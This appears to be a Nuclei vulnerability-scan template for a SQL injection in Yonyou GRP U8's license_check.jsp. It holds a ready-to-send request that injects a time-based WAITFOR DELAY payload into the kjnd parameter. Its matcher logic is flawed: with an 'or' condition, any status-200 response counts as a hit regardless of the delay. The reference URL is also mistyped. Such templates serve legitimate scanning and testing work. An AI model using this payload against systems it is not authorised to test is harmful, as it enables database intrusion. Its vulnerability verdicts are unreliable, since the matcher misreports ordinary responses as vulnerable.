id: yongyouOA-GRP-U8-license-check-jsp-SQL
info:
  name: 用友 GRP U8 license_check.jsp 存在SQL注入
  author: cnaq
  severity: high  
  description: 用友 GRP U8 license_check.jsp 存在SQL注入
  reference: 
    - hhttps://github.com/wy876/POC/blob/main/%E7%94%A8%E5%8F%8B%20GRP%20U8%20license_check.jsp%20%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5.md
  tags: yongyouOA,sql,injection 

requests:
  - raw:
      - |
        GET /u8qx/license_check.jsp?kjnd=1%27;WAITFOR%20DELAY%20%270:0:5%27-- HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
        Connection: close
        
    matchers-condition: or
    matchers:
      - type: status
        status:
          - 200
      - type: dsl # DSL匹配
        dsl:
          - 'duration>=5'
          - 'duration<8' # 漏洞持续时间大于5秒，小于8秒
        condition: and # 将默认的 or 的关系改为 and
